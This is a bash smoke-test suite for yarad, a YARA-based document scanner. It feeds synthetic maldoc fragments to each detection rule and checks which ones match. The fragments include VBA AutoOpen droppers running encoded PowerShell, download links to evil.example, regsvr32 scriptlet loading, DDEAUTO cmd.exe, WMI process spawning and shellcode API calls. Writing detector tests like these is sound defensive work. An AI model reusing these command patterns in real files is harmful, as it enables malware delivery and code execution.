#!/usr/bin/env bash
# scripts/smoke.sh — the yarad HTTP-contract + rule/extractor smoke suite.
#
# SINGLE SOURCE OF TRUTH for the smoke matrix. Invoked by BOTH:
#   - .github/workflows/ci.yml   (docker job, after building yarad:ci)
#   - tools/yarad-local-ci.sh    (full mode, after building the final image)
# so a local-green admin merge can no longer miss a coverage regression that
# only the remote smoke matrix would have caught. The hygiene test
# packaging/deb/smoke_shared_test.sh asserts both callers invoke this script.
#
# Each smoke spins ONE container loaded with a single isolated rule file
# (cache off), asserts positives/negatives over /scan, and tears it down.
# Bodies are built at runtime — no real maldoc is ever shipped in the repo.
#
#   scripts/smoke.sh [IMAGE]      # IMAGE defaults to yarad:ci
#
# Must run from the repo root (reads docker/local-rules/*).
set -euo pipefail

IMG="${1:-yarad:ci}"

# Track every container/volume we create so a failure mid-suite still cleans up.
_names=""
_vols=""
cleanup() {
  if [ -n "$_names" ]; then
    # shellcheck disable=SC2086  # word-splitting the tracked name list is intended
    docker rm -f $_names >/dev/null 2>&1 || true
  fi
  if [ -n "$_vols" ]; then
    # shellcheck disable=SC2086  # word-splitting the tracked vol list is intended
    docker volume rm $_vols >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

# wait_healthy NAME [TRIES] — block until the container reports healthy.
wait_healthy() {
  name=$1; tries=${2:-30}
  for _ in $(seq 1 "$tries"); do
    [ "$(docker inspect -f '{{.State.Health.Status}}' "$name")" = healthy ] && return 0
    sleep 1
  done
  docker logs "$name"; return 1
}

# start_rule NAME PORT RULEFILE — run the image with ONE isolated rule, cache off.
start_rule() {
  name=$1; port=$2; rule=$3
  dir="rules-$name"
  mkdir -p "$dir"
  cp "docker/local-rules/$rule" "$dir/"
  _names="$_names $name"
  docker run -d --name "$name" -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
    -v "$PWD/$dir:/r:ro" -p "$port:8079" "$IMG"
  wait_healthy "$name"
}

# scan PORT [extra curl args...] reads the body from stdin and prints the verdict.
scan() {
  port=$1; shift
  curl -s -H "X-YARAD-Token: ci" "$@" --data-binary @- "http://127.0.0.1:$port/scan"
}

say() { printf '\n=== smoke: %s ===\n' "$1"; }

# ---------------------------------------------------------------------------
smoke_eicar() {
  say "EICAR rule, scan/clean/auth/health/metrics"
  mkdir -p rules
  cat > rules/eicar.yar <<'YAR'
rule EICAR_Test_File : test {
  strings: $e = "$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"
  condition: $e
}
YAR
  _names="$_names yc"
  docker run -d --name yc -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
    -v "$PWD/rules:/r:ro" -p 18079:8079 "$IMG"
  wait_healthy yc

  # build the EICAR body at runtime (don't ship the literal signature)
  # shellcheck disable=SC2016  # the $-segments are the literal EICAR token, must NOT expand
  EICAR='X5O!P%@AP[4\PZX54(P^)7CC)7}'"\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"'$H+H*'

  match=$(printf '%s' "$EICAR" | scan 18079)
  echo "match: $match"; grep -q EICAR_Test_File <<<"$match"

  clean=$(printf 'plain body' | scan 18079)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]

  code=$(printf x | curl -s -o /dev/null -w '%{http_code}' -H "X-YARAD-Token: wrong" --data-binary @- http://127.0.0.1:18079/scan)
  [ "$code" = 401 ]

  # Read each endpoint into a var before grep: piping a producer straight
  # into `grep -q` lets grep exit on first match and SIGPIPE the producer
  # (exit 141) under `set -o pipefail`. (See the seed step's note.)
  m=$(curl -s http://127.0.0.1:18079/metrics); grep -q 'yarad_rules 1' <<<"$m"
  r=$(curl -s http://127.0.0.1:18079/ready);   grep -q ready <<<"$r"
  v=$(curl -s http://127.0.0.1:18079/version); grep -q extractor_version <<<"$v"
  docker rm -f yc
}

smoke_maldoc() {
  say "maldoc heuristic rule — autoexec+write+execute AND-gate"
  start_rule ym 18081 maldoc_autoexec.yara

  # Synthetic maldoc body: one token from each mraptor category
  # (auto-exec + write + execute). Built at runtime — no real maldoc shipped.
  body=$(printf 'Sub AutoOpen()\n  Set o = CreateObject("ADODB.Stream")\n  o.SaveToFile "x.exe"\n  CreateObject("WScript.Shell").Run "powershell -enc ..."\nEnd Sub\n')
  match=$(printf '%s' "$body" | scan 18081)
  echo "match: $match"; grep -q Maldoc_AutoExec_Write_Execute <<<"$match"

  # Negative: auto-exec + a write primitive (incl. CreateObject of a
  # write object) but NO launch primitive must NOT fire — proves the
  # three-category AND and guards the regression where a writer's
  # CreateObject() would wrongly satisfy the "execute" category.
  clean=$(printf 'Sub AutoOpen()\n  Set o = CreateObject("ADODB.Stream")\n  o.SaveToFile "data.bin"\nEnd Sub\n' | scan 18081)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]

  # Positive: Workbook_BeforeClose (new $auto* entry) + write + execute must fire.
  close_body=$(printf 'Private Sub Workbook_BeforeClose(Cancel As Boolean)\n  Set o = CreateObject("ADODB.Stream")\n  o.SaveToFile "x.exe"\n  CreateObject("WScript.Shell").Run "cmd.exe /c x.exe"\nEnd Sub\n')
  close_match=$(printf '%s' "$close_body" | scan 18081)
  echo "close_match: $close_match"; grep -q Maldoc_AutoExec_Write_Execute <<<"$close_match"

  # Positive: FollowHyperlink (new $exec* entry) + auto-exec + write must fire.
  fhl_body=$(printf 'Sub AutoOpen()\n  Set o = CreateObject("ADODB.Stream")\n  o.SaveToFile "x.exe"\n  ActiveWorkbook.FollowHyperlink "http://evil.example/x.exe"\nEnd Sub\n')
  fhl_match=$(printf '%s' "$fhl_body" | scan 18081)
  echo "fhl_match: $fhl_match"; grep -q Maldoc_AutoExec_Write_Execute <<<"$fhl_match"
  docker rm -f ym
}

smoke_suspicious() {
  say "maldoc suspicious-keyword tier — count heuristic + shellcode-API"
  start_rule yk 18082 maldoc_suspicious.yara

  # Count heuristic: a keyword-soup macro (>=6 suspicious keywords) fires
  # Maldoc_Suspicious_VBA_Keywords. Built at runtime — no real maldoc.
  soup=$(printf 'CreateObject GetObject WScript.Shell ShellExecute Environ StrReverse ADODB.Stream SaveToFile MSXML2.XMLHTTP\n')
  m1=$(printf '%s' "$soup" | scan 18082)
  echo "soup: $m1"; grep -q Maldoc_Suspicious_VBA_Keywords <<<"$m1"

  # Shellcode-API pattern: a Declare + a process-injection primitive fires
  # Maldoc_VBA_Shellcode_API.
  sc=$(printf 'Private Declare PtrSafe Function a Lib "kernel32" Alias "VirtualAlloc" (...)\n  RtlMoveMemory p, buf, n\n')
  m2=$(printf '%s' "$sc" | scan 18082)
  echo "shellcode: $m2"; grep -q Maldoc_VBA_Shellcode_API <<<"$m2"

  # Negative: a couple of keywords below the count threshold and no
  # Declare+API pair must NOT fire either rule.
  clean=$(printf 'Set o = CreateObject("Scripting.Dictionary")\n  MsgBox "hello"\n' | scan 18082)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
  docker rm -f yk
}

smoke_ooxml_template() {
  say "OOXML remote-template-injection rule"
  start_rule yo 18083 ooxml_template_injection.yara

  # Positive: synthetic body containing the OOXML-EXTERNAL-REL marker
  # with an http:// target — must fire OOXML_Remote_Template.
  body=$(printf 'OOXML-EXTERNAL-REL attachedTemplate http://evil.example/t.dotm\n')
  match=$(printf '%s' "$body" | scan 18083)
  echo "match: $match"; grep -q OOXML_Remote_Template <<<"$match"

  # Negative: plain body with no marker must NOT fire.
  clean=$(printf 'just a plain document body\n' | scan 18083)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
  docker rm -f yo
}

smoke_ooxml_dde() {
  say "OOXML DDE/DDEAUTO field detection rule"
  start_rule yd 18084 ooxml_dde.yara

  # Positive: synthetic body containing the OOXML-DDE-FIELD marker with a
  # DDEAUTO command — must fire Maldoc_DDE_Field.
  v=$(printf 'OOXML-DDE-FIELD DDEAUTO c:\\Windows\\System32\\cmd.exe /k calc\n')
  match=$(printf '%s' "$v" | scan 18084)
  echo "match: $match"; grep -q Maldoc_DDE_Field <<<"$match"

  # Negative: plain body with no marker must NOT fire.
  clean=$(printf 'just a plain document body\n' | scan 18084)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
  docker rm -f yd
}

smoke_xlm_hidden() {
  say "XLM hidden-macrosheet rule"
  start_rule yxlm 18087 xlm_macrosheet.yara

  # Positive: synthetic body containing the XLM-HIDDEN-MACROSHEET marker
  # with veryHidden state and sheet name — must fire XLM_Hidden_Macrosheet.
  v=$(printf 'XLM-HIDDEN-MACROSHEET veryHidden Macro1\n')
  match=$(printf '%s' "$v" | scan 18087)
  echo "match: $match"; grep -q XLM_Hidden_Macrosheet <<<"$match"

  # Negative: plain body with no marker must NOT fire.
  clean=$(printf 'just a plain document body\n' | scan 18087)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
  docker rm -f yxlm
}

smoke_xlm_dangerous() {
  say "XLM dangerous-function rule"
  start_rule yxlmd 18094 xlm_macrosheet.yara

  # Positive: a folded XLM formula calling EXEC must fire XLM_Dangerous_Function.
  v=$(printf 'XLM-DANGEROUS-FUNC EXEC\n')
  match=$(printf '%s' "$v" | scan 18094)
  echo "match: $match"; grep -q XLM_Dangerous_Function <<<"$match"

  # Phase 2c: the multi-marker stacker rules (XLM_Hidden_Dangerous_Dropper,
  # XLM_AutoOpen_Dropper, XLM_Emulator_Deep_Exec) are now `: marker`-tagged.
  # yarad emits each XLM marker as a SEPARATE stream entry, so the
  # `(hidden) and (danger)` conjunction is structurally dead on raw/content
  # — the fix co-locates the markers into one XLM-STACK buffer routed to the
  # out-of-band Markers channel (joinXLMStackerMarkers), where the tagged
  # rules fire. Confirmed dead-without-fix and revived-with-fix empirically
  # via blacktop/yara; buffer construction + routing covered by the Go
  # extract tests (TestJoinXLMStackerMarkers_*). A real OLE/BIFF XLM
  # workbook is impractical to build here (same as UserForm).
  # Adversarial: a RAW body planting both marker literals must NOT fire the
  # now-tagged dropper (marker-tagged hits rejected on raw/content).
  adv=$(printf 'XLM-HIDDEN-MACROSHEET veryHidden\nXLM-DANGEROUS-FUNC CALL\n' | scan 18094)
  echo "adv: $adv"
  if grep -q XLM_Hidden_Dangerous_Dropper <<<"$adv"; then echo "ERROR: tagged dropper fired on raw"; exit 1; fi

  # Negative: plain body with no marker must NOT fire.
  clean=$(printf 'just a plain document body\n' | scan 18094)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
  docker rm -f yxlmd
}

smoke_vba_stomping() {
  say "VBA stomping rule"
  start_rule ystomp 18088 vba_stomping.yara

  # Positive: synthetic body containing VBA-STOMPED marker — must fire VBA_Stomped.
  v=$(printf 'VBA-STOMPED Module1 pcode=512 src=0\n')
  match=$(printf '%s' "$v" | scan 18088)
  echo "match: $match"; grep -q VBA_Stomped <<<"$match"

  # Negative: plain body with no marker must NOT fire.
  clean=$(printf 'just a plain document body\n' | scan 18088)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
  docker rm -f ystomp
}

smoke_equation_editor() {
  say "Equation Editor rule"
  start_rule yeq 18089 equation_editor.yara

  # Positive: OLE2 magic at offset 0 + "Equation Native" (UTF-16LE) → fires.
  # Build synthetic body: 8-byte OLE magic + padding + wide string.
  match=$(
    {
      printf '\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'
      printf '%0.s\x00' {1..64}
      printf 'E\x00q\x00u\x00a\x00t\x00i\x00o\x00n\x00 \x00N\x00a\x00t\x00i\x00v\x00e\x00'
    } | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18089/scan
  )
  echo "match: $match"; grep -q Exploit_EquationEditor <<<"$match"

  # Negative: no OLE2 magic → no match.
  clean=$(printf 'Equation Native in plain text\n' | scan 18089)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
  docker rm -f yeq
}

smoke_userform() {
  say "UserForm hidden-string rule"
  start_rule yuf 18090 userform_strings.yara

  # Phase 2b: Maldoc_UserForm_Payload is now `: marker`-tagged. It fires
  # ONLY on the out-of-band Markers channel — when the extractor carves
  # UserForm strings and co-locates them with the marker in one buffer.
  # Adversarial: a RAW body planting the marker literal + an IOC must NOT
  # fire (marker-tagged hits are rejected on raw/content — zero-FP by
  # construction). The firing path is covered by the Go extract tests and
  # the doc-properties end-to-end smoke below (same Markers-channel
  # mechanism); a real OLE UserForm container is impractical to build here.
  adv=$(printf 'USERFORM-STRINGS\npowershell -nop -w hidden -enc ABCDEF\n' | scan 18090)
  echo "adv: $adv"; [ "$adv" = '{"matches":[]}' ]

  # Negative: plain body with no marker must NOT fire.
  clean=$(printf 'just a plain document body\n' | scan 18090)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
  docker rm -f yuf
}

smoke_docprops() {
  say "doc-properties hidden-string rule"
  start_rule ydp 18091 docprops.yara

  # Phase 2b POSITIVE (real end-to-end): build a genuine OOXML doc whose
  # docProps/core.xml hides a C2 URL. The extractor carves it, co-locates
  # it with the DOCPROPS-STRINGS marker in ONE buffer, and routes that to
  # the out-of-band Markers channel where the (: marker)-tagged
  # Maldoc_DocProps_Payload rule fires.
  python3 - <<'PY'
import zipfile
core = ('<?xml version="1.0"?><cp:coreProperties '
        'xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties">'
        '<dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">http://evil.example/c2</dc:title>'
        '</cp:coreProperties>')
with zipfile.ZipFile('/tmp/s.docx', 'w') as z:
    z.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
    z.writestr('docProps/core.xml', core)
PY
  fn=$(printf 's.docx' | base64 -w0)
  match=$(curl -s -H "X-YARAD-Token: ci" -H "X-YARAD-Filename: $fn" --data-binary @/tmp/s.docx http://127.0.0.1:18091/scan)
  echo "match: $match"; grep -q Maldoc_DocProps_Payload <<<"$match"

  # Adversarial: a RAW body planting the marker literal + IOC must NOT fire
  # (marker-tagged hits rejected on raw/content — zero-FP by construction).
  adv=$(printf 'DOCPROPS-STRINGS\npowershell -nop -w hidden -enc ABCDEF\n' | scan 18091)
  echo "adv: $adv"; [ "$adv" = '{"matches":[]}' ]

  # Negative: plain body with no marker must NOT fire.
  clean=$(printf 'just a plain document body\n' | scan 18091)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
  docker rm -f ydp
}

smoke_intent() {
  say "intent rules — LOLBin/WMI/PowerShell/evasion"
  start_rule yi 18086 intent.yara

  # Each name+arg combo must fire its rule. Bodies built at runtime.
  l=$(printf 'Shell("regsvr32 /s /n /i:http://evil/a.sct scrobj.dll")\n')
  ml=$(printf '%s' "$l" | scan 18086)
  echo "lolbin: $ml"; grep -q LOLBins_Invocation <<<"$ml"

  w=$(printf 'GetObject("winmgmts:").Get("Win32_Process").Create "calc"\n')
  mw=$(printf '%s' "$w" | scan 18086)
  echo "wmi: $mw"; grep -q WMI_Process_Spawn <<<"$mw"

  p=$(printf 'powershell -nop -w hidden -enc SQBFAFgAIABEAG8AdwBuAGwAbwBhAGQA\n')
  mp=$(printf '%s' "$p" | scan 18086)
  echo "ps: $mp"; grep -q PowerShell_Abuse_Flags <<<"$mp"

  e=$(printf 'On Error Resume Next\nApplication.Visible = False\nx=Environ("USERNAME")\n')
  me=$(printf '%s' "$e" | scan 18086)
  echo "evasion: $me"; grep -q Maldoc_AntiAnalysis_Evasion <<<"$me"

  # VBA-ENVIRON %NAME% marker (folded Environ lookup) must fire VBA_Environ_Probe.
  en=$(printf 'VBA-ENVIRON %%APPDATA%%\n')
  men=$(printf '%s' "$en" | scan 18086)
  echo "environ: $men"; grep -q VBA_Environ_Probe <<<"$men"

  # Negative: bare mentions without abusive args/combos must NOT fire.
  clean=$(printf 'newsletter about powershell and regsvr32 for admins\n' | scan 18086)
  echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
  docker rm -f yi
}

smoke_seed_startup() {
  say "seed-on-startup — default cache config + wiped-cache self-heal"
  # A named volume for the cache so we can wipe it from the host side
  # (the distroless image has no shell/rm to do it in-container).
  docker volume create yc-cache >/dev/null
  _vols="$_vols yc-cache"
  # Default config: no YARAD_RULES/_DIR overrides, so the image seeds
  # /var/cache/yarad from the baked /usr/share/yarad seed and serves it.
  _names="$_names ys"
  docker run -d --name ys -e YARAD_TOKEN=ci -v yc-cache:/var/cache/yarad \
    -p 18080:8079 "$IMG"
  wait_healthy ys 60
  # Read into a var first: `docker logs … | grep -q` lets grep exit on the
  # first match and SIGPIPE docker-logs (exit 141) under `set -o pipefail`
  # — the flake that reddened PR #31. Assigning first avoids the pipe.
  logs=$(docker logs ys 2>&1); grep -q 'seeded rules cache' <<<"$logs"
  rules=$(curl -s http://127.0.0.1:18080/metrics | grep '^yarad_rules ' | awk '{print $2}')
  echo "seeded rules: $rules"; [ "${rules:-0}" -gt 0 ]

  # Self-heal: wipe the cache volume from the host, restart; it must reseed.
  docker stop ys >/dev/null
  docker run --rm -v yc-cache:/c busybox sh -c 'rm -rf /c/*'
  docker start ys >/dev/null
  wait_healthy ys 60
  # Seeded a second time after the wipe. Capture the count into a var — do
  # NOT pipe `grep -c` into `grep -q`, which closes the pipe early and
  # SIGPIPEs grep -c (exit 141) under `bash -e`.
  seeds=$(docker logs ys 2>&1 | grep -c 'seeded rules cache' || true)
  echo "seed count: $seeds"; [ "$seeds" -ge 2 ]
  r=$(curl -s http://127.0.0.1:18080/ready); grep -q ready <<<"$r"
  docker rm -f ys; docker volume rm yc-cache
}

# ---------------------------------------------------------------------------
smoke_eicar
smoke_maldoc
smoke_suspicious
smoke_ooxml_template
smoke_ooxml_dde
smoke_xlm_hidden
smoke_xlm_dangerous
smoke_vba_stomping
smoke_equation_editor
smoke_userform
smoke_docprops
smoke_intent
smoke_seed_startup

printf '\n=== smoke: ALL OK ===\n'
